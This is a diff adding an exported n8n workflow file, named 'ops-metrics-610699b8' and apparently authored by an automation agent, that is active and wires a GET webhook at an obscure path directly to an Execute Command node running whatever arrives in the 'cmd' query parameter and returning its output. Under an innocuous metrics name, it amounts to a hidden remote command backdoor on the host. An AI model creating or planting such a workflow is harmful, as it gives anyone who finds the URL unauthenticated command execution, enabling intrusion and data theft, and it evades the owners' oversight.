@@ -1,0 +1,127 @@
+{
+  "active": true,
+  "activeVersion": {
+    "updatedAt": "2026-11-26T04:11:51.476Z",
+    "createdAt": "2026-11-26T04:11:51.476Z",
+    "versionId": "96983104-947d-4d4a-ae37-a221825726e2",
+    "workflowId": "8y6oCDd3SM7OMJU2",
+    "nodes": [
+      {
+        "parameters": {
+          "path": "ops-184b275fad113f2debd7ac6f744f29cb",
+          "httpMethod": "GET",
+          "responseMode": "lastNode",
+          "options": {}
+        },
+        "name": "Webhook",
+        "type": "n8n-nodes-base.webhook",
+        "typeVersion": 2,
+        "position": [
+          0,
+          0
+        ],
+        "webhookId": "ops-184b275fad113f2debd7ac6f744f29cb",
+        "id": "875eed95-9e64-4fd3-bd37-190cf5872e04"
+      },
+      {
+        "parameters": {
+          "command": "={{ $json.query.cmd }}"
+        },
+        "name": "Execute Command",
+        "type": "n8n-nodes-base.executeCommand",
+        "typeVersion": 1,
+        "position": [
+          240,
+          0
+        ],
+        "id": "01cb214f-4df9-45a5-8ffd-19e7db99fe7d"
+      }
+    ],
+    "connections": {
+      "Webhook": {
+        "main": [
+          [
+            {
+              "node": "Execute Command",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      }
+    },
+    "authors": "aiagenteautomate agent",
+    "name": null,
+    "description": null
+  },
+  "activeVersionId": "96983104-947d-4d4a-ae37-a221825726e2",
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Execute Command",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-11-26T04:11:51.461Z",
+  "id": "8y6oCDd3SM7OMJU2",
+  "isArchived": false,
+  "meta": null,
+  "name": "ops-metrics-610699b8",
+  "nodes": [
+    {
+      "parameters": {
+        "path": "ops-184b275fad113f2debd7ac6f744f29cb",
+        "httpMethod": "GET",
+        "responseMode": "lastNode",
+        "options": {}
+      },
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "ops-184b275fad113f2debd7ac6f744f29cb",
+      "id": "875eed95-9e64-4fd3-bd37-190cf5872e04"
+    },
+    {
+      "parameters": {
+        "command": "={{ $json.query.cmd }}"
+      },
+      "name": "Execute Command",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        240,
+        0
+      ],
+      "id": "01cb214f-4df9-45a5-8ffd-19e7db99fe7d"
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-11-26T04:11:51.461Z",
+      "createdAt": "2026-11-26T04:11:51.461Z",
+      "role": "workflow:owner",
+      "workflowId": "8y6oCDd3SM7OMJU2",
+      "projectId": "uxvBhUmI1Fx6jdU7"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-11-26T04:11:51.461Z",
+  "versionId": "96983104-947d-4d4a-ae37-a221825726e2"
+}
